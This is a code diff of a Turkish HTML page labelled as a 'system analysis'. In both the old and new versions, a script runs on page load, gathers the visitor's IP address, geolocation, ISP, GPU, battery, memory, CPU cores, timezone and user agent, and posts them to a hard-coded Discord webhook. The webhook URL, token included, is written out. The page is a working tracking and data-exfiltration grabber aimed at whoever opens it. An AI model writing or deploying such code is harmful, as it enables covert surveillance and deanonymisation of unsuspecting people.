@@ -2,72 +2,77 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Cihaz Raporu</title>
+    <title>Sistem Analizi</title>
 </head>
-<body style="background-color: #23272a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-
-    <h2 id="durum">⚙️ Sistem Analiz Ediliyor...</h2>
-    <p id="detay">Lütfen bekleyin...</p>
+<body style="background-color: #000; color: #0f0; font-family: monospace; padding: 20px;">
+    <h2>[+] SİSTEM ANALİZİ BAŞLATILDI...</h2>
+    <div id="log"></div>
 
     <script>
-        // Hata vermemesi için linki tek parça ve düz tırnakla ekledim
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function raporGonder() {
-            const durum = document.getElementById('durum');
-            const detay = document.getElementById('detay');
+        async function tumBilgileriTopla() {
+            const log = document.getElementById('log');
+            log.innerHTML += "<p>> Veriler çekiliyor...</p>";
 
             try {
-                // IP bilgisini al
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                // 1. IP ve Konum Detayları
+                const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
-                
-                // Cihaz verilerini hazırla
-                const veriler = {
-                    ip: ipData.ip,
-                    dil: navigator.language,
-                    ekran: window.screen.width + "x" + window.screen.height,
-                    zaman: new Date().toLocaleString('tr-TR'),
-                    platform: navigator.platform
-                };
 
-                // Discord mesaj yapısı
-                const discordMesaj = {
+                // 2. GPU (Ekran Kartı) Bilgisi
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Bilinmiyor";
+
+                // 3. Batarya Bilgisi
+                let pil = "Bilgi Yok";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    pil = `${Math.round(b.level * 100)}% (${b.charging ? 'Şarj Oluyor' : 'Deşarj'})`;
+                }
+
+                // 4. Tüm Bilgileri Paketle
+                const rapor = {
                     embeds: [{
-                        title: "📱 Cihaz Bilgileri",
-                        color: 15105570,
+                        title: "🚀 TAM SİSTEM ANALİZ RAPORU",
+                        color: 16711680, // Kırmızı
                         fields: [
-                            { name: "🌐 IP Adresi", value: veriler.ip, inline: true },
-                            { name: "🌍 Dil", value: veriler.dil, inline: true },
-                            { name: "🖥️ Çözünürlük", value: veriler.ekran, inline: true },
-                            { name: "🕒 Zaman", value: veriler.zaman, inline: false },
-                            { name: "⚙️ Platform", value: veriler.platform, inline: false }
-                        ]
+                            { name: "🌐 IP Adresi", value: ipData.ip || "Yok", inline: true },
+                            { name: "🏢 Şehir/Ülke", value: `${ipData.city}/${ipData.country_name}`, inline: true },
+                            { name: "📡 Operatör/ISS", value: ipData.org || "Yok", inline: true },
+                            { name: "🔋 Batarya", value: pil, inline: true },
+                            { name: "🧠 RAM (Yaklaşık)", value: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor", inline: true },
+                            { name: "⚡ İşlemci Çekirdek", value: navigator.hardwareConcurrency || "Bilinmiyor", inline: true },
+                            { name: "🖥️ Ekran Kartı (GPU)", value: "```" + gpu + "```", inline: false },
+                            { name: "📐 Ekran Çözünürlüğü", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
+                            { name: "🌍 Cihaz Dili", value: navigator.language, inline: true },
+                            { name: "⏰ Saat Dilimi", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                            { name: "🔗 Sayfa URL", value: window.location.href, inline: false },
+                            { name: "🕵️ Tarayıcı Kimliği", value: "```" + navigator.userAgent + "```", inline: false }
+                        ],
+                        footer: { text: "Raporlama Zamanı: " + new Date().toLocaleString('tr-TR') }
                     }]
                 };
 
-                // Veriyi gönder
+                // 5. Discord'a Gönder
                 const res = await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(discordMesaj)
+                    body: JSON.stringify(rapor)
                 });
 
                 if (res.ok) {
-                    durum.innerText = "✅ Rapor Gönderildi!";
-                    detay.innerText = "Discord kanalını kontrol edebilirsin.";
-                } else {
-                    durum.innerText = "❌ Sunucu Reddeti";
-                    detay.innerText = "Hata kodu: " + res.status;
+                    log.innerHTML += "<p style='color:white;'>[+] Tüm bilgiler Discord'a iletildi.</p>";
                 }
 
             } catch (err) {
-                durum.innerText = "⚠️ Bağlantı Sorunu";
-                detay.innerText = "Hata detay: " + err;
+                log.innerHTML += "<p style='color:red;'>[!] Hata: " + err + "</p>";
             }
         }
 
-        window.onload = raporGonder;
+        window.onload = tumBilgileriTopla;
     </script>
 </body>
 </html>
